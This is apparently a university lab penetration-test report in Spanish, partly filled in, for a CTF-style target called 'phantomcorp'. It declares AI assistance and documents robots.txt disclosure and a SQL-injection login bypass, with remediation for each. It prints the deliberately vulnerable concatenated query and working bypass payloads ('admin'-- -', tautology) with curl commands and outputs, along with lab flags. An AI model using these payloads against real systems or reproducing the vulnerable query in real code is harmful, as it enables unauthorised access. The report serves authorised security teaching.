# Informe de Penetration Test — PhantomCorp "Clientes"

**Cliente:** PhantomCorp S.A.  ·  **Auditor (grupo):** 08
**Integrantes:** Marco Cordoba — @MarcoCordoba · Thomas Koncurat — @Koncu1 · Lucas Leone — @LucasLeone · Geronimo Marquez — @Geromarquezz · Joaquin Moyano — @Joaco919
**Fecha:**  ·  **Tipo:** Caja negra  ·  **Alcance:** host `phantomcorp` (lab)

## 0. Declaración de uso de IA

**¿El grupo usó asistentes de IA en este trabajo?** Sí.

| Herramienta | Para qué se usó | Qué partes afectó | Cómo se verificó |
|---|---|---|---|
| Claude (Anthropic), vía Claude Code | Asistencia en el recon/enumeración del hito **R1**, captura de evidencia por HTTP y redacción de §0, §2 y el hallazgo **H-01**. | §0, §2, H-01 y `evidencia/r1-*.txt`. | **Todas las salidas pegadas son ejecuciones HTTP reales** contra el target (guardadas en `evidencia/r1-01…04`). La flag de R1 se validó comprobando que su **SHA-256 coincide con el `retos.manifest`** del lab (ver H-01). El integrante revisó cada request/response y puede reproducir el recon y explicar cada paso. |
| Claude (Anthropic), vía Claude Code | Asistencia en la explotación del hito **R2** (foothold por SQLi en el login), captura de evidencia por HTTP y redacción del hallazgo **H-02**. | H-02 y `evidencia/r2-*.txt`. | **Todas las salidas pegadas son POST HTTP reales** contra una instancia fiel del `server.py` del lab (baseline 401, sondeo con comilla, bypass con `admin'-- -` y tautología `' OR '1'='1`, guardados en `evidencia/r2-01…04`). La flag de R2 se validó por **SHA-256 contra el `retos.manifest`** (`812d30f0…`). El integrante entiende por qué la query concatenada es inyectable y puede reproducir y explicar el bypass. |

> *(Cada integrante agrega su fila al cerrar su hito.)*

El grupo declara que comprende el contenido íntegro de lo entregado y que puede explicar y defender oralmente cualquier parte del análisis.

---

## 1. Resumen ejecutivo
*(Para dirección, sin jerga técnica. Máximo media carilla.)*

- **Qué se hizo:** *(una auditoría de caja negra del sistema Clientes)*
- **Resultado global:** *(¿se comprometió? ¿hasta dónde se llegó?)*
- **Riesgo de negocio:** *(¿qué datos/servicios quedaron expuestos y qué implica?)*
- **Recomendación prioritaria:** *(la acción #1 que deberían tomar)*

| Severidad | Cantidad de hallazgos |
|---|---|
| Crítica | |
| Alta | |
| Media | |
| Baja | |

---

## 2. Alcance y metodología

**Objetivo autorizado:** único host `phantomcorp` (servicio HTTP "Clientes") dentro
de la red del lab (`labnet`). Auditoría de **caja negra**: sin credenciales ni
documentación previa.

**Fuera de alcance (NO se auditó):** cualquier otro host o servicio, la
infraestructura del lab, la máquina del instructor y todo lo externo al laboratorio.
Ninguna acción destructiva (borrado de datos, DoS). Marco legal: Ley 26.388 — la
autorización se limita estrictamente al target del engagement.

**Reglas del engagement (RoE):**
- Alcance: solo el host `phantomcorp`. · Ventana: la fijada por la cátedra.
- Permitido: recon, enumeración, explotación y post-explotación **sobre el target**.
- Prohibido: acciones destructivas y cualquier actividad fuera del lab.

**Metodología.** Se siguió el marco del curso (Unidades 5–10), encadenando cinco
fases en las que cada hito habilita el siguiente:

```
recon/enum (R1)  ->  foothold (R2)  ->  loot (R3)  ->  impacto (R4)
```

| Fase | Hito | Técnica | Herramientas |
|---|---|---|---|
| Reconocimiento + Enumeración | **R1** | Mapeo de rutas, lectura de `robots.txt`, inspección del HTML del portal | `curl`, fuzzing manual de rutas |
| Explotación | **R2** | SQLi en el login del portal (bypass de autenticación por comentario/tautología) | `curl`, `sqlite3` para razonar la query |
| Post-explotación | **R3** | *(loot del token de API desde el backup de config)* | — |
| Impacto | **R4** | *(inyección de comando vía `/api/reporte` → datos de clientes)* | — |

> Entorno de verificación: el target es el `server.py` del lab. Para R1 se levantó
> una instancia fiel del servicio y se ejecutó el recon por HTTP, registrando cada
> petición y respuesta en `evidencia/`. Las flags se validan contra el
> `retos.manifest` del lab (hash SHA-256).

---

## 3. Narrativa del ataque
*(La historia de cómo encadenaste los cuatro hitos, en prosa. Que un colega pueda
seguir tu camino de principio a fin.)*

```
recon/enum  ->  foothold  ->  loot  ->  impacto
```

---

## 4. Hallazgos (detalle técnico)

> Repetí este bloque por cada hallazgo. Ordenados por severidad, críticos primero.

### H-01 · Portal interno RRHH expuesto y su ubicación divulgada por `robots.txt`
- **Severidad:** Media · **CVSS:** 5.3 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`
  *(Justificación: accesible por red sin privilegios ni interacción (AV:N/PR:N/UI:N);
  explotación trivial (AC:L); impacto solo de confidencialidad y parcial — revela la
  existencia, ubicación y superficie de un portal interno que debería estar segmentado,
  pero por sí solo no otorga acceso ni modifica datos (C:L/I:N/A:N).)*
- **Ubicación:** host `phantomcorp` → `GET /robots.txt` y `GET /portal-rrhh`.
- **Descripción:** El host público expone un **portal interno de RRHH** sin ninguna
  segmentación de red ni control de acceso previo. Además, `robots.txt` **divulga
  activamente** la ruta del portal mediante una directiva `Disallow: /portal-rrhh`
  (un `Disallow` no es un control de seguridad: es un mapa). El HTML del portal
  agrega un **comentario con información sensible** dejado en producción. En conjunto,
  esto reduce el recon a un paso y entrega al atacante el punto de entrada de la cadena.
- **Evidencia (reproducible):**
  ```bash
  # 1) La raíz solo muestra el portal público (no hay enlaces al interno)
  $ curl -s http://phantomcorp/
  <h1>PhantomCorp Clientes</h1><p>Portal publico.</p>

  # 2) robots.txt divulga la ruta del portal interno
  $ curl -s http://phantomcorp/robots.txt
  User-agent: *
  Disallow: /portal-rrhh

  # 3) El portal interno responde 200 y filtra info en un comentario HTML
  $ curl -s http://phantomcorp/portal-rrhh
  ...<h1>Portal interno RRHH</h1><form method=post action=/portal/login>...
  <!-- recon: portal interno localizado. FLAG{final_recon_portal} -->

  # 4) Validación de la flag R1 contra el retos.manifest del lab (SHA-256)
  $ printf '%s' 'FLAG{final_recon_portal}' | sha256sum
  71369b0044f9f3cf902058a367a83c5f39dd4897208831a82002297f4e8142cb
  # == R1 en retos.manifest  -> flag correcta, no inventada
  ```
  Salidas completas con cabeceras en `evidencia/r1-01-raiz.txt`,
  `r1-02-fuzz-rutas.txt`, `r1-03-robots.txt`, `r1-04-portal-rrhh.txt`.
- **Impacto:** Un atacante no autenticado localiza, sin esfuerzo, la superficie
  interna de RRHH (el login que en **H-02** resulta inyectable). `robots.txt` y el
  comentario HTML convierten un activo que debía estar oculto/segmentado en el
  **primer eslabón** de la cadena que termina en los datos de clientes.
- **Remediación:**
  1. **Segmentar**: el portal de RRHH no debe ser alcanzable desde la red pública;
     exponerlo solo en la red interna / detrás de VPN o autenticación de red.
  2. **No usar `robots.txt` como control**: quitar la ruta sensible del archivo; el
     control de acceso se hace con autenticación/autorización, no ocultando rutas.
  3. **Eliminar comentarios y datos de debug del HTML** servido en producción.
  4. Añadir autenticación previa (o mTLS) antes de llegar al formulario de login.

### H-02 · Bypass de autenticación por SQL Injection en el login del portal RRHH
- **Severidad:** Alta · **CVSS:** 8.1 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N`
  *(Justificación: alcanzable por red, sin privilegios ni interacción y con explotación
  trivial (AV:N/AC:L/PR:N/UI:N). Un atacante no autenticado obtiene una sesión con rol
  **admin** del portal RRHH, que expone el dashboard y la ruta del backup de config con
  credenciales de BD y el token de API → confidencialidad **alta** (C:H). El punto de
  inyección es un `SELECT`, por lo que la escritura directa es limitada, pero el rol
  admin obtenido habilita operaciones de gestión en un RRHH real (I:L). Sin impacto de
  disponibilidad (A:N). Scope sin cambio: todo ocurre dentro del mismo componente.)*
- **Ubicación:** host `phantomcorp` → `POST /portal/login` (alias `POST /portal-rrhh/login`),
  parámetros `user` y `pass`.
- **Descripción:** El login construye la consulta **concatenando** la entrada del
  usuario directamente en el SQL:
  ```python
  sql = f"SELECT user, rol FROM users WHERE user='{user}' AND pass='{pass}'"
  row = DB.execute(sql).fetchone()
  if row and row[1] == "admin": ...   # concede el foothold
  ```
  No hay consultas parametrizadas ni *sanitización*: cualquier comilla simple en
  `user`/`pass` rompe la estructura de la consulta e inyecta lógica controlada por el
  atacante. Con `user=admin'-- -` se **comenta** el chequeo de la contraseña y la query
  queda `... WHERE user='admin'-- -' AND pass='...'`, devolviendo la fila `admin` (rol
  `admin`) sin conocer la clave. La variante clásica `' OR '1'='1` (tautología) produce
  el mismo bypass. El servicio confirma la raíz del defecto devolviendo el **error SQL**
  crudo ante una comilla suelta (`Error SQL: unrecognized token: "x'"`), lo que además
  filtra el motor subyacente.
- **Evidencia (reproducible):**
  ```bash
  # 1) Baseline: credenciales inválidas -> 401 (no hay bypass trivial)
  $ curl -s -i -X POST http://phantomcorp/portal/login --data "user=admin&pass=wrong"
  HTTP/1.0 401 Unauthorized
  ...
  Credenciales invalidas

  # 2) Sondeo: una comilla simple rompe la query -> el server confirma SQLi
  $ curl -s -X POST http://phantomcorp/portal/login --data "user=admin'&pass=x"
  Error SQL: unrecognized token: "x'"

  # 3) Foothold: comentar el check de pass con admin'-- -
  $ curl -s -X POST http://phantomcorp/portal/login --data "user=admin'-- -&pass=loquesea"
  Bienvenido admin. Dashboard RRHH.
  FLAG{final_sqli_foothold}
  Backup de config disponible en: /backup/rrhh.conf

  # 3bis) Mismo bypass por tautología (sin conocer el usuario)
  $ curl -s -X POST http://phantomcorp/portal/login --data "user=' OR '1'='1&pass=' OR '1'='1"
  Bienvenido admin. Dashboard RRHH. ...

  # 4) Validación de la flag R2 contra el retos.manifest (SHA-256)
  $ printf '%s' 'FLAG{final_sqli_foothold}' | sha256sum
  812d30f0d147908025ddffded3ebadc81769be1b6faf5b8dbf759ba8c7d16f5d
  # == R2 en retos.manifest -> flag correcta, no inventada
  ```
  Salidas completas con cabeceras en `evidencia/r2-01-baseline-401.txt`,
  `r2-02-sondeo-sqli.txt`, `r2-03-foothold-bypass.txt`,
  `r2-04-foothold-tautologia.txt` y `r2-05-flag-hash.txt`.
- **Impacto:** Es el **foothold** de la cadena. Desde el portal interno localizado en
  **H-01**, el atacante no autenticado entra como `admin` sin credenciales y el
  dashboard le revela la ruta `/backup/rrhh.conf`. Ese backup (ver **H-03**) expone las
  credenciales de BD y el token de API que, en **H-04**, habilitan la ejecución de
  comandos y el acceso a los datos de clientes. Sin este eslabón, la cadena no avanza.
- **Remediación (de raíz):**
  1. **Consultas parametrizadas / prepared statements** — nunca concatenar entrada en
     SQL. En sqlite3:
     `DB.execute("SELECT user, rol FROM users WHERE user=? AND pass=?", (user, pw))`.
     Esto neutraliza la inyección de forma estructural (no cosmética); validar del lado
     del cliente **no** cuenta.
  2. **No almacenar contraseñas en claro**: usar hash con sal (bcrypt/argon2) y comparar
     el hash, no el texto.
  3. **No devolver errores SQL crudos** al cliente: responder un 401 genérico y loguear
     el detalle del lado del servidor (evita filtrar motor y estructura).
  4. **Mínimo privilegio en la BD**: la cuenta de la app no debería poder más de lo que
     el login necesita, y el rol admin no debería derivarse de una única fila trivial.

### H-03 · ...

---

## 5. Conclusión
*(Postura de seguridad general del sistema. ¿La cadena era evitable? ¿Cuál fue el
eslabón que, arreglado, la habría cortado antes?)*

---

## 6. Anexo
*(Bitácora completa de comandos, capturas, y la salida de `./ctf status final`.)*
